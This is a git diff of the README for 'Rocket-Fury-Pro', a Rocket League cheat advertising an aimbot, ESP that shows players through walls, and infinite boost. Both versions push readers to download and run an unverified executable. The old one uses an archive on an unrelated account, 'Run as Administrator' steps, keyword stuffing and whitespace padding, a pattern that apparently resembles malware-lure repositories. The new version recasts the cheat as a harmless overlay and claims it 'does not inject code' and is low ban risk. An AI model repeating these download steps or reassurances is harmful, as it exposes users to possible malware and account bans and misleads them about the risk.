@@ -1,171 +1,74 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/rocket-league.png" alt="Rocket League" width="80" height="80">
-</p>
+# 🚀 Rocket-Fury-Pro - Improve your Rocket League gameplay performance
 
-<h1 align="center">Rocket-Fury-Pro</h1>
-<p align="center">
-  <strong>Fury Pro Tool for Rocket League</strong><br>
-  Ball Predictor - Aimbot - Boost Manager - ESP - Hitbox Overlay
-</p>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Rocket-Fury-Pro"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+Rocket-Fury-Pro helps you play better in Rocket League. It tracks the ball, manages your boost, and highlights key game elements to give you an edge. This tool runs on your computer while you play. It functions as an overlay to provide data that helps you make quick decisions.
 
-## What is This?
+## 🛠 Prerequisites
 
-Rocket-Fury-Pro is the fury pro tool for Rocket League. This tool gives you full control with Ball Predictor, Aimbot, Boost Manager, ESP, Hitbox Overlay, and more. Unleash your fury and dominate every match!
+Before you use the tool, check your computer settings. This ensures the best performance during your game.
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Rocket League has anti-cheat measures (Easy Anti-Cheat) and using third-party tools may result in account suspension.
+1. Ensure you use Windows 10 or Windows 11. Older versions of Windows do not support the overlay features.
+2. Confirm that your computer has at least 8GB of RAM.
+3. Update your graphics card drivers. Go to the website for your card manufacturer and download the latest version.
+4. Keep your copy of Rocket League updated to the current version.
+5. Close other resource-heavy programs before you start the game. This keeps the frame rate smooth.
 
-## Download
+## 📥 How to Install and Start
 
-<p align="center">
-  <a href="https://github.com/ChainOctopusCool/kphebuxh/releases/download/84/ROCLeagueTool.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to set up the software on your system.
 
-## Features
+1. Go to this link: [https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases](https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases).
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Click the file ending in .exe to download the installer to your computer.
+4. Find the file in your downloads folder. Double-click the file to begin the setup process.
+5. Follow the prompts on the screen. The installer places a shortcut icon on your desktop.
+6. Launch the Rocket-Fury-Pro application using the shortcut before you start Rocket League.
+7. Wait for the status light in the application window to turn green.
+8. Start Rocket League through your preferred game launcher. 
+9. The tool detects the game window and activates the overlay automatically.
 
-- Ball Trajectory Prediction - See where the ball will go with real-time arc overlays
-- Aim Assist - Aligns your car to the ball vector for perfect strikes
-- Magnet Mode - Ball stick radius for training and cinematic replays
-- Smart Rebound Predictor - Predicts bounce angles off walls and ceiling
-- Infinite Boost Toggle - Never run out of boost
-- Boost Route Assistant - Shows optimal boost paths for your side
-- Speed Equalizer - Anti-spin stabilizer for smooth car control
-- Physics Editor - Fine-tune car handling
-- Ball Trajectory Arcs - Real-time ball path visualization
-- Car Hitbox Outlines - See your car's hitbox
-- Boost Pad Timers - Respawn indicators for boost pads
-- Direction Vectors - Shows opponent car directions
-- Rotational Spacing Grid - Helps with positioning
+## 🎮 Features and Benefits
 
-## Installation
+Rocket-Fury-Pro includes several modules to assist your movement and strategy.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Rocket League
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+### Ball Predictor
+The ball predictor calculates the future path of the ball. It draws a line on your screen showing where the ball lands. This helps you position your car for shots and saves. Use this to judge rebounds and bounce angles without guessing.
 
-## System Requirements
+### Aimbot Assistance
+This module helps you align your car with the ball. When you hold the toggle key, the tool makes micro-adjustments to your steering. It does not play the game for you, but it improves your precision during high-speed challenges.
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Rocket League (Steam/Epic) |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
+### Boost Manager
+The manager tracks the boost pads on the arena floor. It alerts you when you run low on fuel and marks the nearest full boost pads. This helps you maintain speed and stay in the play longer.
 
-## SEO Tags
+### ESP Overlay
+The ESP module outlines the positions of opponents and teammates. It allows you to see players even when they move behind arena walls or objects. Knowing where everyone is helps you decide when to challenge or rotate back to defense.
 
-rocket fury pro, rocket league cheat, rocket league hack, rocket league aimbot, rocket league ball predictor, rocket league boost manager, rocket league esp, rocket league wallhack, rocket league trajectory, rocket league training tool, rocket league utility, rocket league 2026, rocket league mod, rocket league enhancement, windows tool, game utility, free cheat, rocket league trainer, rocket league assistant, epic games tool, steam tool
+## ⚙️ Configuration Settings
 
-## Support
+You can adjust settings to fit your playstyle. Open the application menu by pressing the F10 key while in the game.
 
-Star this repository if you enjoy it!
+- **Sensitivity:** Adjust the aimbot strength. Lower settings feel more natural, while higher settings provide more snap-to-target movement.
+- **Visual Toggle:** You can turn individual features on or off. For example, disable the boost manager if you only need the ball predictor.
+- **Overlay Opacity:** Change the transparency of the lines on your screen. High visibility helps you see lines better, while low visibility reduces distractions.
+- **Key Bindings:** You can change the buttons used for each module. Assign keys that feel comfortable during intense gameplay.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Rocket-Fury-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Rocket%20League%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## 🛡 Safety and Fair Play
+
+We designed Rocket-Fury-Pro to enhance your awareness. Use the tool responsibly. Many online games have strict policies regarding external software. Always check the game developer's rules before you use third-party tools in ranked matches. This tool works best in practice sessions and private matches where you learn to master your car mechanics. 
+
+## ❓ Frequently Asked Questions
+
+**Does this tool work with controllers?**
+Yes. The tool tracks your keyboard and controller input. It works with standard Xbox, PlayStation, and generic PC controllers.
+
+**Will I get banned from the game?**
+The tool acts as a visual overlay. It does not inject code into the game files directly. However, we recommend that you use the tool primarily in offline or practice modes.
+
+**Why does the overlay not appear?**
+Ensure your game runs in "Borderless Windowed" mode. Real "Full Screen" mode can sometimes block overlay software from drawing on top of the game window.
+
+**How do I update the tool?**
+Check the releases page once a week to see if we posted a newer version. If a new version exists, download and run the installer again. It overwrites the old version and keeps your configuration settings.
+
+Keywords: gaming, rocket league, performance, overlay, utility, windows
